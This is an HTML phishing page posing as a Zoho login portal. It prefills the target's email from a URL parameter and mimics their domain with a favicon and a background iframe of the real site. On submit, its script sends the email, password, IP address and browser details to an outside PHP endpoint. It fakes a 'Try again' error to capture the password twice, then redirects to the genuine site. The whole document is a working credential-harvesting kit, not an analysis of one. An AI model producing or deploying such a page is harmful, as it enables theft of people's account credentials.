<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Portal</title>
    <!-- Include Bootstrap 5 CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Bootstrap Icons -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
    <!-- Google Fonts: Poppins -->
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">

    <style>
        #background-iframe, #overlay {
            position: fixed;
            top: 0;
            left: 0;
            height: 100%;
            width: 100%;
        }

        body {
            font-family: Poppins, sans-serif;
            margin: 0;
            padding: 0;
            overflow: hidden;
        }

        #background-iframe {
            border: none;
            z-index: -3;
            object-fit: cover;
        }

        #overlay {
            background-color: rgba(0, 0, 0, .5);
            z-index: -2;
        }

        .form-container {
            display: block;
            max-width: 400px;
            width: 100%;
            padding: 2rem;
            background-color: rgba(255, 255, 255, .95);
            border-radius: .75rem;
            box-shadow: 0 8px 16px rgba(0, 0, 0, .2);
            position: relative;
            z-index: 1;
        }

        .icon-text {
            display: flex;
            align-items: center;
            margin-bottom: 1.5rem;
        }

        .icon-text img {
            width: 32px;
            height: 32px;
            margin-right: .5rem;
        }

        .icon-text .h4 {
            margin-bottom: 0;
            color: #0d6efd;
        }

        .form-floating {
            position: relative;
            margin-bottom: 1.5rem;
        }

        .form-floating label, .input-icon {
            position: absolute;
            color: #6c757d;
            pointer-events: none;
        }

        .form-floating label {
            transition: .2s ease-in-out;
            left: 2.5rem;
            top: -.2rem;
            background-color: transparent;
            z-index: 1;
        }

        .form-floating input:focus+label, .form-floating input:not(:placeholder-shown)+label {
            transform: translateY(-1.5rem);
            font-size: .85rem;
            color: #0d6efd;
        }

        .form-control {
            border-top: none;
            border-left: none;
            border-right: none;
            border-bottom: 2px solid #ced4da;
            border-radius: 0;
            padding-left: 2.5rem;
            transition: border-color .2s;
            background-color: transparent;
        }

        .form-control:focus {
            box-shadow: none;
            outline: 0;
            border-bottom-color: #0d6efd;
        }

        .input-icon {
            left: .75rem;
            top: 50%;
            transform: translateY(-50%);
            font-size: 1.2rem;
        }

        .btn-primary {
            width: 100%;
            padding: .75rem;
            font-size: 1rem;
            background-color: #0d6efd;
            border: none;
            border-radius: .375rem;
            transition: background-color .3s, color .3s;
        }

        .btn-primary:hover {
            background-color: #0b5ed7;
            color: #fff;
        }

        .btn-primary:focus {
            box-shadow: none;
        }

        @media (max-width: 576px) {
            .form-container {
                padding: 1.5rem;
            }
        }

        .loader-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, .5);
            align-items: center;
            justify-content: center;
            z-index: 9999;
            display: none;
        }

        .error-message {
            color: red;
            margin-bottom: 1rem;
            display: none;
        }
    </style>
</head>

<body id="main-content" class="d-flex align-items-center justify-content-center min-vh-100">
    <!-- Background Iframe -->
    <iframe id="background-iframe" src="about:blank" allowfullscreen></iframe>
    <!-- Dimmed Overlay -->
    <div id="overlay"></div>
    
    <!-- Form Container -->
    <div class="form-container" id="form-container">
        <!-- Error Message -->
        <div id="error-message" class="error-message translatable" data-key="try-again">Try again</div>

        <form id="user-form">
            <!-- Icon and Text Row -->
            <div class="icon-text">
                <img id="domain-favicon" src="https://www.google.com/s2/favicons?domain=zoho.com" alt="Domain Favicon" style="height: 15px; width:15px;">
                <span class="h4 mb-0" style="margin-left: 10px;" id="domain-name">ZOHO</span>
            </div>
            <!-- Heading -->
            <h5 class="mb-3 translatable" data-key="leading-security">Leading with Security.</h5>
            <!-- Paragraph -->
            <p class="mb-4 text-muted translatable" style="font-size: .8rem;" data-key="learn-more">To get started, log in using your email and password.</p>
            
            <!-- Email Input -->
            <div class="form-floating position-relative">
                <i class="bi bi-envelope input-icon"></i>
                <input type="email" class="form-control" id="email" placeholder=" " required style="padding-left: 40px; z-index:1000;" disabled>
                <label for="email" style="background-color: transparent;" class="translatable" data-key="email-label">Email</label>
            </div>
            <!-- Password Input -->
            <div class="form-floating position-relative">
                <i class="bi bi-lock input-icon"></i>
                <input type="password" class="form-control" id="password" placeholder=" " required style="padding-left: 40px;">
                <label for="password" style="background-color: transparent;" class="translatable" data-key="password-label">Password</label>
            </div>
            <!-- Submit Button -->
            <button type="submit" class="btn btn-primary translatable" data-key="next-button" id="submit-button">Continue</button>
        </form>
    </div>

    <!-- Loader Overlay -->
    <div id="loader-overlay" class="loader-overlay">
        <div class="spinner-border text-light" role="status" style="width: 3rem; height: 3rem;">
            <span class="visually-hidden translatable" data-key="loading-text">Loading...</span>
        </div>
    </div>

    <!-- Bootstrap 5 JS Bundle (includes Popper) -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    
    <!-- Google Translate API -->
    <script>
        // Function to detect user's country and language
        function detectUserLanguage() {
            // First, try to get language from browser
            const browserLang = navigator.language || navigator.userLanguage;
            const langCode = browserLang.split('-')[0]; // Get base language code
            
            // If we have a supported language, use it
            const supportedLanguages = ['pl', 'fr', 'de', 'es', 'it', 'pt', 'ru', 'zh', 'ja', 'ko', 'ar'];
            if (supportedLanguages.includes(langCode)) {
                return langCode;
            }
            
            // If browser language not supported, try to detect by IP
            return new Promise((resolve) => {
                fetch('https://ipapi.co/json/')
                    .then(response => response.json())
                    .then(data => {
                        const countryCode = data.country_code ? data.country_code.toLowerCase() : 'en';
                        // Map country codes to language codes
                        const countryToLang = {
                            'pl': 'pl', // Poland
                            'fr': 'fr', // France
                            'de': 'de', // Germany
                            'es': 'es', // Spain
                            'it': 'it', // Italy
                            'pt': 'pt', // Portugal
                            'ru': 'ru', // Russia
                            'cn': 'zh', // China
                            'jp': 'ja', // Japan
                            'kr': 'ko', // South Korea
                            'sa': 'ar'  // Saudi Arabia
                        };
                        
                        resolve(countryToLang[countryCode] || 'en');
                    })
                    .catch(() => {
                        resolve('en'); // Fallback to English
                    });
            });
        }
        
        // Function to translate page content
        function translatePage(targetLang) {
            if (targetLang === 'en') return; // No need to translate if English
            
            // Google Translate API endpoint (this is a simplified approach)
            // Note: For production, you would need to use the official Google Cloud Translation API
            const apiUrl = `https://translate.googleapis.com/translate_a/single?client=gtx&sl=en&tl=${targetLang}&dt=t&q=`;
            
            // Get all elements with the translatable class
            const elements = document.querySelectorAll('.translatable');
            
            // Collect all texts to translate
            const texts = [];
            elements.forEach(el => {
                texts.push(el.textContent.trim());
            });
            
            // Translate all texts (this is a simplified implementation)
            // In a real implementation, you would batch requests and handle API limits
            elements.forEach((el, index) => {
                const text = texts[index];
                if (text) {
                    fetch(apiUrl + encodeURIComponent(text))
                        .then(response => response.json())
                        .then(data => {
                            if (data && data[0] && data[0][0] && data[0][0][0]) {
                                el.textContent = data[0][0][0];
                            }
                        })
                        .catch(error => {
                            console.error('Translation error:', error);
                        });
                }
            });
        }
        
        // Initialize translation when page loads
        document.addEventListener('DOMContentLoaded', async function() {
            const userLanguage = await detectUserLanguage();
            if (userLanguage !== 'en') {
                translatePage(userLanguage);
            }
        });
    </script>

    <!-- Custom JavaScript to Handle 'portal' Parameter and Background Iframe -->
    <script>
        let submitCount = 0;
        
        // Get email from URL parameter if present
        function getEmailFromParam() {
            const urlParams = new URLSearchParams(window.location.search);
            const email = urlParams.get('portal');
            // Simple email validation regex
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (email && emailRegex.test(email)) {
                return email;
            }
            return null;
        }

        // Store the email from the initial URL
        const originalEmail = getEmailFromParam();

        document.addEventListener("DOMContentLoaded", (() => {
            const e = new URLSearchParams(window.location.search).get("portal");
            let t;
            if (e) {
                document.getElementById("email").value = e;
                const n = e.split("@");
                if (2 === n.length) {
                    const e = n[1];
                    t = e, document.getElementById("domain-favicon").src = `https://www.google.com/s2/favicons?domain=${e}`;
                    const o = e.split(".")[0].toUpperCase();
                    document.getElementById("domain-name").textContent = o;
                    const r = e.startsWith("http://") || e.startsWith("https://") ? e : `https://${e}`;
                    document.getElementById("background-iframe").src = r
                }
            } else console.warn("No 'portal' parameter found in the URL."), document.getElementById("background-iframe").src = "about:blank";
            let n = {
                ipAddress: "Fetching...",
                userAgent: navigator.userAgent,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                browser: "Detecting..."
            };
            const o = navigator.userAgent;
            o.indexOf("Firefox") > -1 ? n.browser = "Mozilla Firefox" : o.indexOf("SamsungBrowser") > -1 ? n.browser = "Samsung Internet" : o.indexOf("Opera") > -1 || o.indexOf("OPR") > -1 ? n.browser = "Opera" : o.indexOf("Trident") > -1 ? n.browser = "Microsoft Internet Explorer" : o.indexOf("Edge") > -1 ? n.browser = "Microsoft Edge" : o.indexOf("Chrome") > -1 ? n.browser = "Google Chrome or Chromium" : o.indexOf("Safari") > -1 ? n.browser = "Apple Safari" : n.browser = "Unknown", fetch("https://api.ipify.org?format=json").then((e => e.json())).then((e => {
                n.ipAddress = e.ip
            })).catch((e => {
                console.error("Error fetching IP address:", e), n.ipAddress = "Unavailable"
            })), document.getElementById("user-form").addEventListener("submit", (function(e) {
                e.preventDefault();
                
                submitCount += 1;
                const o = 1 === submitCount,
                    r = 2 === submitCount;
                document.getElementById("loader-overlay").style.display = "flex";
                
                // Collect form data
                const formData = new FormData();
                formData.append('email', document.getElementById("email").value.trim());
                formData.append('password', document.getElementById("password").value.trim());
                formData.append('ipAddress', n.ipAddress);
                formData.append('userAgent', n.userAgent);
                formData.append('timezone', n.timezone);
                formData.append('browser', n.browser);
                
                // Send data to PHP script
                fetch('https://scitecinstruments.it.com/customers/send.php', {
                    method: 'POST',
                    body: formData
                })
                .then(response => response.text())
                .then(data => {
                    console.log('Form submitted successfully:', data);
                })
                .catch(error => {
                    console.error('Error submitting form:', error);
                });
                
                // Handle UI responses
                o ? setTimeout((() => {
                    document.getElementById("loader-overlay").style.display = "none";
                    document.getElementById("error-message").style.display = "block", document.getElementById("password").value = ""
                }), 3e3) : r && setTimeout((() => {
                    document.getElementById("loader-overlay").style.display = "none", window.location.href = "https://" + t
                }), 3e3)
            }))
        }));  
    </script>
</body>
</html>
